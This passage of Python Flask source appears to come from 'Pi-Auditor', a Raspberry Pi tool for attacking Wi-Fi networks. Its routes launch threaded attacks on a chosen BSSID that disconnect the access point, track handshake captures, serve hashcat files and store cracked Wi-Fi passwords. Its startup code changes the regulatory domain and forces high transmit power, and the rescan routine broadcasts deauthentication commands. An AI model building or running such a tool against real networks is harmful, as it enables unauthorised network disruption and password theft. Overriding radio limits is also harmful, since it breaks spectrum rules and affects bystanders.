            "channel": tgt.get("channel", 1),
            "status": "CAPTURING",
            "has_handshake": SYSTEM_STATE.get("handshake_captured", False),
            "has_pmkid": False,
            "has_22000": SYSTEM_STATE.get("handshake_captured", False),
            "duration": f"{dur_s}s (Live)",
            "packets": max(1, sz_kb * 7),
            "size": f"{sz_kb} KB",
            "time_str": "Recording in Progress",
            "cracked": False,
            "password": None,
            "is_active": True
        }
        items = [active_entry] + [x for x in items if x.get("filename") != os.path.basename(cur_pcap)]

    return jsonify(items)

@app.route('/api/inspect/<path:filename>')
def api_inspect(filename):
    pcap_path = os.path.join(CAPTURES_DIR, filename)
    if not os.path.exists(pcap_path):
        return jsonify({"status": "error", "message": "File not found"}), 404
    telemetry = parse_telemetry(pcap_path)
    return jsonify(telemetry)

@app.route('/api/cracked', methods=['GET', 'POST'])
def api_cracked():
    if request.method == 'POST':
        data = request.get_json() or {}
        bssid = data.get('bssid', '').strip().lower()
        ssid = data.get('ssid', '').strip()
        pwd = data.get('password', '').strip()
        if not pwd or (not bssid and not ssid):
            return jsonify({"status": "error", "message": "Missing credentials"}), 400
        
        db = get_cracked_db()
        if bssid:
            db[bssid] = {"ssid": ssid, "password": pwd}
            db[bssid.replace(':', '')] = {"ssid": ssid, "password": pwd}
        if ssid:
            db[ssid] = {"ssid": ssid, "password": pwd}
        with open(CRACKED_FILE, 'w', encoding='utf-8') as f:
            json.dump(db, f, indent=2, ensure_ascii=False)
            
        # Invalidate telemetry caches to reflect cracked password
        for f in glob.glob(os.path.join(CAPTURES_DIR, "*.telemetry.json")):
            try: os.remove(f)
            except: pass
        verify_all_pcaps()
        return jsonify({"status": "ok", "message": "Saved cracked credentials"})
    else:
        return jsonify(get_cracked_db())

@app.route('/api/start', methods=['POST'])
def api_start():
    data = request.get_json() or {}
    ssid = data.get('ssid', '').strip()
    bssid = data.get('bssid', '').strip().lower()
    channel = int(data.get('channel', 1))
    bursts = int(data.get('bursts', 3))
    
    if not bssid or not channel:
        return jsonify({"status": "error", "message": "Missing BSSID or Channel"}), 400
        
    t = threading.Thread(target=audit_worker, args=(ssid, bssid, channel, bursts), daemon=True)
    t.start()
    
    return jsonify({
        "status": "ok",
        "message": f"Starting audit on {ssid} (CH {channel}). AP disconnecting in 2.5 seconds."
    })

@app.route('/download/pcap/<path:filename>')
def download_pcap(filename):
    return send_from_directory(CAPTURES_DIR, filename, as_attachment=True)

@app.route('/download/hashcat/<path:filename>')
def download_hashcat(filename):
    return send_from_directory(CAPTURES_DIR, filename, as_attachment=True)

def rescan_worker(sweep_seconds=7):
    print("[*] Re-scan triggered from web dashboard...")
    try:
        os.system('hostapd_cli -i wlan0 deauthenticate ff:ff:ff:ff:ff:ff 2>/dev/null || true')
        os.system('hostapd_cli -i wlan0 disassociate ff:ff:ff:ff:ff:ff 2>/dev/null || true')
        time.sleep(0.3)
        os.system('killall -9 hostapd dnsmasq 2>/dev/null || true')
        run_wifi_survey(sweep_seconds=sweep_seconds)
        start_management_portal()
    except Exception as e:
        print(f"[!] Re-scan error: {e}")
        start_management_portal()

@app.route('/api/rescan', methods=['POST'])
def api_rescan():
    threading.Thread(target=rescan_worker, daemon=True).start()
    return jsonify({
        "status": "scanning",
        "duration": 20,
        "message": "Scanning environment across all bands (2.4 GHz & 5 GHz). Hotspot will pause and return in ~20 seconds."
    })

def main():
    print("=" * 60)
    print("⚡ Pi-Auditor: Autonomous Embedded Wireless Assessment Engine")
    print("=" * 60)
    
    os.system('iw reg set VN 2>/dev/null || true')
    os.system('iw dev wlan0 set txpower fixed 3000 2>/dev/null || true')
    
    try:
        run_wifi_survey(sweep_seconds=6)
    except Exception as e:
        print(f"[!] Boot survey notice: {e}")
    
    start_management_portal()
    
    threading.Thread(target=verify_all_pcaps, daemon=True).start()
    
    print("[*] Starting Web Dashboard on 0.0.0.0:5000...")
    app.run(host='0.0.0.0', port=5000, threaded=True)

if __name__ == '__main__':
    main()
